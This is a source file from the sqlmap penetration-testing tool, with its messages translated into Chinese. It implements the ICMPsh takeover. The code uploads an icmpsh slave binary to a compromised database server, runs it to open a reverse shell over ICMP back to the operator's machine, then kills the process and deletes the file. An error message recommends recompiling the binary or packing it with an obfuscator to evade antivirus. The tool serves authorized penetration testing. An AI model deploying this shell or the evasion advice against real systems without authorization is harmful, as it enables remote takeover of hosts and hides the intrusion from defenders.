#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re
import socket
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import SqlmapDataException

class ICMPsh(object):
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))

    def _selectRhost(self):
        address = None
        message = "後端 DBMS 的地址是什麼？"

        if self.remoteIP:
            message += "[按回車鍵使用默認值 '%s'(檢測到的值)] " % self.remoteIP

        while not address:
            address = readInput(message, default=self.remoteIP)

            if conf.batch and not address:
                raise SqlmapDataException("遠程主機地址缺失")

        return address

    def _selectLhost(self):
        address = None
        message = "本地地址是什麼？"

        if self.localIP:
            message += "[按回車鍵使用自動檢測到的地址 '%s']" % self.localIP

        valid = None
        while not valid:
            valid = True
            address = readInput(message, default=self.localIP or "")

            try:
                socket.inet_aton(address)
            except socket.error:
                valid = False
            finally:
                valid = valid and re.search(r"\d+\.\d+\.\d+\.\d+", address) is not None

            if conf.batch and not address:
                raise SqlmapDataException("缺少本地主機地址")
            elif address and not valid:
                warnMsg = "無效的本地主機地址"
                logger.warning(warnMsg)

        return address

    def _prepareIngredients(self, encode=True):
        self.localIP = getattr(self, "localIP", None)
        self.remoteIP = getattr(self, "remoteIP", None)
        self.lhostStr = ICMPsh._selectLhost(self)
        self.rhostStr = ICMPsh._selectRhost(self)

    def _runIcmpshMaster(self):
        infoMsg = "在本地運行 icmpsh 主控端"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def _runIcmpshSlaveRemote(self):
        infoMsg = "在遠程運行 icmpsh 從屬端"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        ICMPsh._initVars(self)
        self._randStr = randomStr(lowercase=True)
        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr

        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))

        logger.info("正在將 icmpsh 從屬程序上傳到 '%s'" % self._icmpslaveRemote)

        if web:
            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
        else:
            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = "上傳 icmpsh 時出現問題,似乎二進制文件未寫入數據庫底層文件系統,或者被防病毒軟件標記為惡意並刪除。在這種情況下,建議對 icmpsh 進行輕微修改後重新編譯源代碼,或者使用混淆軟件進行打包。"
            #errMsg += "looks like the binary file has not been written "
            #errMsg += "on the database underlying file system or an AV has "
            #errMsg += "flagged it as malicious and removed it. In such a case "
            #errMsg += "it is recommended to recompile icmpsh with slight "
            #errMsg += "modification to the source code or pack it with an "
            #errMsg += "obfuscator software"
            logger.error(errMsg)

            return False
        else:
            logger.info("icmpsh 上傳成功")
            return True

    def icmpPwn(self):
        ICMPsh._prepareIngredients(self)
        self._runIcmpshSlaveRemote()
        self._runIcmpshMaster()

        debugMsg = "icmpsh 主控端已退出"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpslaveRemote)
